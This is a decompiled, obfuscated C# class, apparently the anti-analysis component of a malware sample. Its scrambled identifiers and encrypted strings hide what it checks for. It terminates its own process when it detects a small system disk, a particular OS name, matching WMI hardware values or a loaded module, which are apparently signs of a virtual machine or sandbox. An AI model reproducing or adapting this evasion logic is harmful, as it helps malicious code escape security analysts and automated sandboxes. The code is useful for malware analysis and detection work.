using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

internal sealed class duPxglBMqjv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void BXUexnobIYCAv()
	{
		if (jCKziLOiCLSz() || jMyUJviQVJtFjub() || DfPSlJmzOuZQyM() || lFANtZLauXP())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool DfPSlJmzOuZQyM()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool lFANtZLauXP()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107348964)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool jCKziLOiCLSz()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107348959));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107348942)).ToString()!.ToLower();
							if ((text == getString_0(107348893) && current.get_Item(getString_0(107348352)).ToString()!.ToUpperInvariant().Contains(getString_0(107348343))) || text.Contains(getString_0(107348362)) || current.get_Item(getString_0(107348352)).ToString() == getString_0(107348321))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool jMyUJviQVJtFjub()
	{
		try
		{
			if (GetModuleHandle(getString_0(107348336)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	static duPxglBMqjv()
	{
		Strings.CreateGetStringDelegate(typeof(duPxglBMqjv));
	}
}
